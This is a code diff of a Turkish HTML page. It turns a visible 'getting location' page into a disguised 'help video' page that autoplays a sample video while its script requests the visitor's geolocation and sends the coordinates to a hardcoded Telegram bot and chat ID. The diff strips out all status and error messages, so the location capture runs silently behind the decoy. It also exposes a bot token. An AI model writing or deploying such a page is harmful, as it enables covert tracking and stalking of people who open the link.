@@ -1,23 +1,38 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
-  <title>Konum Alınıyor...</title>
+  <meta charset="UTF-8">
+  <title>Yardım Videosu</title>
+  <style>
+    body {
+      margin: 0;
+      background: #000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    video {
+      width: 90%;
+      max-width: 720px;
+      border: 4px solid #fff;
+      border-radius: 12px;
+    }
+  </style>
 </head>
 <body>
-  <h2>Lütfen bekleyin...</h2>
+  <video controls autoplay muted>
+    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+    Tarayıcınız video etiketini desteklemiyor.
+  </video>
+
   <script>
     const botToken = '7315012164:AAFwEEQ-Oi26-gl6o7ulfpCRPzRh1XUPzK8';
     const chatId = '7874399327';
 
     function sendLocation(lat, lon) {
       const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
-      fetch(url)
-        .then(() => {
-          document.body.innerHTML = "<h3>Konum başarıyla gönderildi ✅</h3>";
-        })
-        .catch(() => {
-          document.body.innerHTML = "<h3>Hata oluştu ❌</h3>";
-        });
+      fetch(url).catch(() => {});
     }
 
     function getLocation() {
@@ -26,12 +41,8 @@
           (position) => {
             sendLocation(position.coords.latitude, position.coords.longitude);
           },
-          () => {
-            document.body.innerHTML = "<h3>Konum alınamadı. İzin vermediniz mi? ❗</h3>";
-          }
+          () => {}
         );
-      } else {
-        document.body.innerHTML = "<h3>Tarayıcınız konum desteği sağlamıyor.</h3>";
       }
     }
 
